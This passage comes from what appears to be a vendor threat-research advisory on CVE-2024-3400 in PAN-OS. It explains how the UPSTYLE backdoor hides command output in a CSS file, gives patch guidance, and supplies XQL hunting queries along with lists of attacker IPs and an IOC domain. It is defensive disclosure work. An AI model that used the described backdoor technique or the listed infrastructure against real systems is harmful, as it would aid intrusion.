<li><span style="font-family: 'courier new', courier, monospace;">[snip]/css/bootstrap.min.css</span></li>
</ul>
<p>The script will then create another thread that runs a function called <span style="font-family: 'courier new', courier, monospace;">restore</span>. The <span style="font-family: 'courier new', courier, monospace;">restore</span> function takes the original content of the <span style="font-family: 'courier new', courier, monospace;">bootstrap.min.css</span> file, as well as the original access and modified times, sleeps for 15 seconds and writes the original contents back to the file. It then sets the access and modified times back to their original values.</p>
<p>The point of this function is to avoid leaving the output of the commands available for analysis. Also, this suggests that the threat actor has automation built into the client side of this backdoor, as they only have 15 seconds to grab the results before the backdoor overwrites the file.</p>
<p>The use of legitimate log files to receive commands and a legitimate CSS file to exfiltrate the command results suggests that the threat actors developed this backdoor specifically to run on a compromised firewall.</p>
<h2><a id="post-133365-_zg1rezlvhwuy"></a>Guidance</h2>
<p><span style="font-weight: 400;">We strongly advise customers to immediately upgrade to a fixed version of PAN-OS to protect their devices even when workarounds and mitigations have been applied.</span></p>
<p><span style="font-weight: 400;">This issue is fixed in hotfix releases of PAN-OS 10.2.9-h1, PAN-OS 11.0.4-h1, PAN-OS 11.1.2-h3, and in all later PAN-OS versions. </span></p>
<p><span style="font-weight: 400;">Please see the frequently updated </span><a href="https://security.paloaltonetworks.com/CVE-2024-3400" target="_blank" rel="noopener"><span style="font-weight: 400;">Palo Alto Networks Security Advisory on CVE-2024-3400</span></a><span style="font-weight: 400;"> for information on hotfixes and the most current guidance for mitigating this vulnerability. </span>A Knowledge Base article, <a href="https://knowledgebase.paloaltonetworks.com/KCSArticleDetail?id=kA14u000000CrO6CAK" target="_blank" rel="noopener">How to Remedy CVE-2024-3400</a>, is available in the Customer Support Portal.</p>
<p><span style="font-weight: 400;">In earlier versions of this advisory, disabling device telemetry was listed as a secondary mitigation action. Disabling device telemetry is no longer an effective mitigation. Device telemetry does not need to be enabled for PAN-OS firewalls to be exposed to attacks related to this vulnerability.</span></p>
<h2><a id="post-133365-_vgezw6a4uez"></a>Unit 42 Managed Threat Hunting Queries</h2>
<p>The Unit 42 Managed Threat Hunting team continues to track any attempts to exploit this CVE across our customers, using Cortex XDR and the XQL queries below. Cortex XDR customers can also use these XQL queries to search for signs of exploitation.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-67820bbfc6cbb488907184" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
// Description: Search for domain IOC in raw NGFW logs
dataset = panw_ngfw_url_raw
| filter url_domain ~= ".*nhdata.s3-us-west-2.amazonaws.com"
| fields _time, log_source_name, action, app, url_domain, uri, url_category, source_ip, source_port, dest_ip, dest_port, protocol, rule_matched, rule_matched_uuid</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-67820bbfc6cbb488907184-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-67820bbfc6cbb488907184-2">2</div><div class="crayon-num" data-line="crayon-67820bbfc6cbb488907184-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-67820bbfc6cbb488907184-4">4</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-67820bbfc6cbb488907184-1"><span class="crayon-c">// Description: Search for domain IOC in raw NGFW logs</span></div><div class="crayon-line crayon-striped-line" id="crayon-67820bbfc6cbb488907184-2"><span class="crayon-i">dataset</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-i">panw_ngfw_url_raw</span></div><div class="crayon-line" id="crayon-67820bbfc6cbb488907184-3"><span class="crayon-sy">|</span><span class="crayon-h"> </span><span class="crayon-e">filter </span><span class="crayon-i">url_domain</span><span class="crayon-h"> </span><span class="crayon-sy">~</span>=<span class="crayon-h"> </span><span class="crayon-s">".*nhdata.s3-us-west-2.amazonaws.com"</span></div><div class="crayon-line crayon-striped-line" id="crayon-67820bbfc6cbb488907184-4"><span class="crayon-sy">|</span><span class="crayon-h"> </span><span class="crayon-e">fields </span><span class="crayon-i">_time</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-i">log_source_name</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-i">action</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-i">app</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-i">url_domain</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-i">uri</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-i">url_category</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-i">source_ip</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-i">source_port</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-i">dest_ip</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-i">dest_port</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-i">protocol</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-i">rule_matched</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-i">rule_matched_uuid</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0001 seconds] -->
<p></p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-67820bbfc6cbe779835368" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
// Description: Detect hits for the specific prevention signature for CVE-2024-3400
config case_sensitive = false
| dataset = panw_ngfw_threat_raw
| filter threat_id in (95187,95189,95191)
| fields _time, log_source_name, action, app_category, app_sub_category, threat_id, threat_name, source_ip, source_port, dest_ip, dest_port, *</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-67820bbfc6cbe779835368-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-67820bbfc6cbe779835368-2">2</div><div class="crayon-num" data-line="crayon-67820bbfc6cbe779835368-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-67820bbfc6cbe779835368-4">4</div><div class="crayon-num" data-line="crayon-67820bbfc6cbe779835368-5">5</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-67820bbfc6cbe779835368-1"><span class="crayon-c">// Description: Detect hits for the specific prevention signature for CVE-2024-3400</span></div><div class="crayon-line crayon-striped-line" id="crayon-67820bbfc6cbe779835368-2"><span class="crayon-e">config </span><span class="crayon-i">case_sensitive</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-t">false</span></div><div class="crayon-line" id="crayon-67820bbfc6cbe779835368-3"><span class="crayon-sy">|</span><span class="crayon-h"> </span><span class="crayon-i">dataset</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-i">panw_ngfw_threat_raw</span></div><div class="crayon-line crayon-striped-line" id="crayon-67820bbfc6cbe779835368-4"><span class="crayon-sy">|</span><span class="crayon-h"> </span><span class="crayon-e">filter </span><span class="crayon-e">threat_id </span><span class="crayon-st">in</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-cn">95187</span><span class="crayon-sy">,</span><span class="crayon-cn">95189</span><span class="crayon-sy">,</span><span class="crayon-cn">95191</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-67820bbfc6cbe779835368-5"><span class="crayon-sy">|</span><span class="crayon-h"> </span><span class="crayon-e">fields </span><span class="crayon-i">_time</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-i">log_source_name</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-i">action</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-i">app_category</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-i">app_sub_category</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-i">threat_id</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-i">threat_name</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-i">source_ip</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-i">source_port</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-i">dest_ip</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-i">dest_port</span><span class="crayon-sy">,</span><span class="crayon-h"> </span>*</div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0001 seconds] -->
<p></p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-67820bbfc6cbf174409300" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
// Description: Hits for known IOCs in NGFW traffic
config case_sensitive = false
| dataset = panw_ngfw_traffic_raw
| filter source_ip in ("110.47.250.103","126.227.76.24","38.207.148.123","147.45.70.100","199.119.206.28","38.181.70.3","149.28.194.95","78.141.232.174","38.180.128.159","64.176.226.203","38.180.106.167","173.255.223.159","38.60.218.153","185.108.105.110","146.70.192.174","149.88.27.212","154.223.16.34","38.180.41.251","203.160.86.91","45.121.51.2","172.233.228.93","66.235.168.222","144.172.79.92") or dest_ip in ("110.47.250.103","126.227.76.24","38.207.148.123","147.45.70.100","199.119.206.28","38.181.70.3","149.28.194.95","78.141.232.174","38.180.128.159","64.176.226.203","38.180.106.167","173.255.223.159","38.60.218.153","185.108.105.110","146.70.192.174","149.88.27.212","154.223.16.34","38.180.41.251","203.160.86.91","45.121.51.2","172.233.228.93","66.235.168.222","144.172.79.92") 
| fields _time, log_source_name, action, action_source, app, bytes_sent, bytes_received, bytes_total, source_ip, source_port, dest_ip, dest_port, protocol, rule_matched, rule_matched_uuid, session_end_reason</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-67820bbfc6cbf174409300-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-67820bbfc6cbf174409300-2">2</div><div class="crayon-num" data-line="crayon-67820bbfc6cbf174409300-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-67820bbfc6cbf174409300-4">4</div><div class="crayon-num" data-line="crayon-67820bbfc6cbf174409300-5">5</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-67820bbfc6cbf174409300-1"><span class="crayon-c">// Description: Hits for known IOCs in NGFW traffic</span></div><div class="crayon-line crayon-striped-line" id="crayon-67820bbfc6cbf174409300-2"><span class="crayon-e">config </span><span class="crayon-i">case_sensitive</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-t">false</span></div><div class="crayon-line" id="crayon-67820bbfc6cbf174409300-3"><span class="crayon-sy">|</span><span class="crayon-h"> </span><span class="crayon-i">dataset</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-i">panw_ngfw_traffic_raw</span></div><div class="crayon-line crayon-striped-line" id="crayon-67820bbfc6cbf174409300-4"><span class="crayon-sy">|</span><span class="crayon-h"> </span><span class="crayon-e">filter </span><span class="crayon-e">source_ip </span><span class="crayon-st">in</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-s">"110.47.250.103"</span><span class="crayon-sy">,</span><span class="crayon-s">"126.227.76.24"</span><span class="crayon-sy">,</span><span class="crayon-s">"38.207.148.123"</span><span class="crayon-sy">,</span><span class="crayon-s">"147.45.70.100"</span><span class="crayon-sy">,</span><span class="crayon-s">"199.119.206.28"</span><span class="crayon-sy">,</span><span class="crayon-s">"38.181.70.3"</span><span class="crayon-sy">,</span><span class="crayon-s">"149.28.194.95"</span><span class="crayon-sy">,</span><span class="crayon-s">"78.141.232.174"</span><span class="crayon-sy">,</span><span class="crayon-s">"38.180.128.159"</span><span class="crayon-sy">,</span><span class="crayon-s">"64.176.226.203"</span><span class="crayon-sy">,</span><span class="crayon-s">"38.180.106.167"</span><span class="crayon-sy">,</span><span class="crayon-s">"173.255.223.159"</span><span class="crayon-sy">,</span><span class="crayon-s">"38.60.218.153"</span><span class="crayon-sy">,</span><span class="crayon-s">"185.108.105.110"</span><span class="crayon-sy">,</span><span class="crayon-s">"146.70.192.174"</span><span class="crayon-sy">,</span><span class="crayon-s">"149.88.27.212"</span><span class="crayon-sy">,</span><span class="crayon-s">"154.223.16.34"</span><span class="crayon-sy">,</span><span class="crayon-s">"38.180.41.251"</span><span class="crayon-sy">,</span><span class="crayon-s">"203.160.86.91"</span><span class="crayon-sy">,</span><span class="crayon-s">"45.121.51.2"</span><span class="crayon-sy">,</span><span class="crayon-s">"172.233.228.93"</span><span class="crayon-sy">,</span><span class="crayon-s">"66.235.168.222"</span><span class="crayon-sy">,</span><span class="crayon-s">"144.172.79.92"</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-st">or</span><span class="crayon-h"> </span><span class="crayon-e">dest_ip </span><span class="crayon-st">in</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-s">"110.47.250.103"</span><span class="crayon-sy">,</span><span class="crayon-s">"126.227.76.24"</span><span class="crayon-sy">,</span><span class="crayon-s">"38.207.148.123"</span><span class="crayon-sy">,</span><span class="crayon-s">"147.45.70.100"</span><span class="crayon-sy">,</span><span class="crayon-s">"199.119.206.28"</span><span class="crayon-sy">,</span><span class="crayon-s">"38.181.70.3"</span><span class="crayon-sy">,</span><span class="crayon-s">"149.28.194.95"</span><span class="crayon-sy">,</span><span class="crayon-s">"78.141.232.174"</span><span class="crayon-sy">,</span><span class="crayon-s">"38.180.128.159"</span><span class="crayon-sy">,</span><span class="crayon-s">"64.176.226.203"</span><span class="crayon-sy">,</span><span class="crayon-s">"38.180.106.167"</span><span class="crayon-sy">,</span><span class="crayon-s">"173.255.223.159"</span><span class="crayon-sy">,</span><span class="crayon-s">"38.60.218.153"</span><span class="crayon-sy">,</span><span class="crayon-s">"185.108.105.110"</span><span class="crayon-sy">,</span><span class="crayon-s">"146.70.192.174"</span><span class="crayon-sy">,</span><span class="crayon-s">"149.88.27.212"</span><span class="crayon-sy">,</span><span class="crayon-s">"154.223.16.34"</span><span class="crayon-sy">,</span><span class="crayon-s">"38.180.41.251"</span><span class="crayon-sy">,</span><span class="crayon-s">"203.160.86.91"</span><span class="crayon-sy">,</span><span class="crayon-s">"45.121.51.2"</span><span class="crayon-sy">,</span><span class="crayon-s">"172.233.228.93"</span><span class="crayon-sy">,</span><span class="crayon-s">"66.235.168.222"</span><span class="crayon-sy">,</span><span class="crayon-s">"144.172.79.92"</span><span class="crayon-sy">)</span> </div><div class="crayon-line" id="crayon-67820bbfc6cbf174409300-5"><span class="crayon-sy">|</span><span class="crayon-h"> </span><span class="crayon-e">fields </span><span class="crayon-i">_time</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-i">log_source_name</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-i">action</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-i">action_source</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-i">app</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-i">bytes_sent</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-i">bytes_received</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-i">bytes_total</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-i">source_ip</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-i">source_port</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-i">dest_ip</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-i">dest_port</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-i">protocol</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-i">rule_matched</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-i">rule_matched_uuid</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-i">session_end_reason</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0003 seconds] -->
<p></p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-67820bbfc6cc1254387878" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
// Description: Hits for known IOCs in XDR telemetry and NGFW telemetry (assuming proper integration of NGFW)
config case_sensitive = false
| dataset = xdr_data 
| filter event_type = ENUM.STORY
| filter dst_action_external_hostname ~=".*nhdata.s3-us-west-2.amazonaws.com" OR
dns_query_name ~=".*nhdata.s3-us-west-2.amazonaws.com" OR
action_external_hostname ~=".*nhdata.s3-us-west-2.amazonaws.com" OR
action_remote_ip in ("110.47.250.103","126.227.76.24","38.207.148.123","147.45.70.100","199.119.206.28","38.181.70.3","149.28.194.95","78.141.232.174","38.180.128.159","64.176.226.203","38.180.106.167","173.255.223.159","38.60.218.153","185.108.105.110","146.70.192.174","149.88.27.212","154.223.16.34","38.180.41.251","203.160.86.91","45.121.51.2","172.233.228.93","66.235.168.222","144.172.79.92") 
| fields _time, agent_hostname, actor_process_image_name, action_local_ip, action_remote_ip, action_remote_port, dns_query_name, action_external_hostname</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-67820bbfc6cc1254387878-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-67820bbfc6cc1254387878-2">2</div><div class="crayon-num" data-line="crayon-67820bbfc6cc1254387878-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-67820bbfc6cc1254387878-4">4</div><div class="crayon-num" data-line="crayon-67820bbfc6cc1254387878-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-67820bbfc6cc1254387878-6">6</div><div class="crayon-num" data-line="crayon-67820bbfc6cc1254387878-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-67820bbfc6cc1254387878-8">8</div><div class="crayon-num" data-line="crayon-67820bbfc6cc1254387878-9">9</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-67820bbfc6cc1254387878-1"><span class="crayon-c">// Description: Hits for known IOCs in XDR telemetry and NGFW telemetry (assuming proper integration of NGFW)</span></div><div class="crayon-line crayon-striped-line" id="crayon-67820bbfc6cc1254387878-2"><span class="crayon-e">config </span><span class="crayon-i">case_sensitive</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-t">false</span></div><div class="crayon-line" id="crayon-67820bbfc6cc1254387878-3"><span class="crayon-sy">|</span><span class="crayon-h"> </span><span class="crayon-i">dataset</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-i">xdr_data</span> </div><div class="crayon-line crayon-striped-line" id="crayon-67820bbfc6cc1254387878-4"><span class="crayon-sy">|</span><span class="crayon-h"> </span><span class="crayon-e">filter </span><span class="crayon-i">event_type</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-t">ENUM</span><span class="crayon-sy">.</span><span class="crayon-i">STORY</span></div><div class="crayon-line" id="crayon-67820bbfc6cc1254387878-5"><span class="crayon-sy">|</span><span class="crayon-h"> </span><span class="crayon-e">filter </span><span class="crayon-i">dst_action_external_hostname</span><span class="crayon-h"> </span><span class="crayon-sy">~</span>=<span class="crayon-s">".*nhdata.s3-us-west-2.amazonaws.com"</span><span class="crayon-h"> </span><span class="crayon-st">OR</span></div><div class="crayon-line crayon-striped-line" id="crayon-67820bbfc6cc1254387878-6"><span class="crayon-i">dns_query_name</span><span class="crayon-h"> </span><span class="crayon-sy">~</span>=<span class="crayon-s">".*nhdata.s3-us-west-2.amazonaws.com"</span><span class="crayon-h"> </span><span class="crayon-st">OR</span></div><div class="crayon-line" id="crayon-67820bbfc6cc1254387878-7"><span class="crayon-i">action_external_hostname</span><span class="crayon-h"> </span><span class="crayon-sy">~</span>=<span class="crayon-s">".*nhdata.s3-us-west-2.amazonaws.com"</span><span class="crayon-h"> </span><span class="crayon-st">OR</span></div><div class="crayon-line crayon-striped-line" id="crayon-67820bbfc6cc1254387878-8"><span class="crayon-e">action_remote_ip </span><span class="crayon-st">in</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-s">"110.47.250.103"</span><span class="crayon-sy">,</span><span class="crayon-s">"126.227.76.24"</span><span class="crayon-sy">,</span><span class="crayon-s">"38.207.148.123"</span><span class="crayon-sy">,</span><span class="crayon-s">"147.45.70.100"</span><span class="crayon-sy">,</span><span class="crayon-s">"199.119.206.28"</span><span class="crayon-sy">,</span><span class="crayon-s">"38.181.70.3"</span><span class="crayon-sy">,</span><span class="crayon-s">"149.28.194.95"</span><span class="crayon-sy">,</span><span class="crayon-s">"78.141.232.174"</span><span class="crayon-sy">,</span><span class="crayon-s">"38.180.128.159"</span><span class="crayon-sy">,</span><span class="crayon-s">"64.176.226.203"</span><span class="crayon-sy">,</span><span class="crayon-s">"38.180.106.167"</span><span class="crayon-sy">,</span><span class="crayon-s">"173.255.223.159"</span><span class="crayon-sy">,</span><span class="crayon-s">"38.60.218.153"</span><span class="crayon-sy">,</span><span class="crayon-s">"185.108.105.110"</span><span class="crayon-sy">,</span><span class="crayon-s">"146.70.192.174"</span><span class="crayon-sy">,</span><span class="crayon-s">"149.88.27.212"</span><span class="crayon-sy">,</span><span class="crayon-s">"154.223.16.34"</span><span class="crayon-sy">,</span><span class="crayon-s">"38.180.41.251"</span><span class="crayon-sy">,</span><span class="crayon-s">"203.160.86.91"</span><span class="crayon-sy">,</span><span class="crayon-s">"45.121.51.2"</span><span class="crayon-sy">,</span><span class="crayon-s">"172.233.228.93"</span><span class="crayon-sy">,</span><span class="crayon-s">"66.235.168.222"</span><span class="crayon-sy">,</span><span class="crayon-s">"144.172.79.92"</span><span class="crayon-sy">)</span> </div><div class="crayon-line" id="crayon-67820bbfc6cc1254387878-9"><span class="crayon-sy">|</span><span class="crayon-h"> </span><span class="crayon-e">fields </span><span class="crayon-i">_time</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-i">agent_hostname</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-i">actor_process_image_name</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-i">action_local_ip</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-i">action_remote_ip</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-i">action_remote_port</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-i">dns_query_name</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-i">action_external_hostname</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0002 seconds] -->
<p></p>
<h2><a id="midnightadditionalobs"></a>Additional Exploitation Observations</h2>
<p><span style="font-weight: 400;">While continuing to monitor efforts, we have observed additional IP addresses attempting to exploit CVE-2024-3400 based on our Threat Prevention signature with a Threat ID 95187. </span></p>
<p>We have not seen any relationships between these indicators and those associated with Operation MidnightEclipse. We have grouped the latter of these indicators exclusively to the activity involving exploitation of the zero-day vulnerability and the UPSTYLE backdoor.</p>
<p><span style="font-weight: 400;">As of writing this update, the following IP addresses have triggered the threat prevention signature:</span></p>
<ul>
<li><span style="font-weight: 400; font-family: 'courier new', courier, monospace;">110.47.250[.]103</span></li>
<li><span style="font-weight: 400; font-family: 'courier new', courier, monospace;">126.227.76[.]24</span></li>
<li><span style="font-weight: 400; font-family: 'courier new', courier, monospace;">38.207.148[.]123</span></li>
<li><span style="font-weight: 400; font-family: 'courier new', courier, monospace;">147.45.70[.]100</span></li>
<li><span style="font-weight: 400; font-family: 'courier new', courier, monospace;">199.119.206[.]28</span></li>
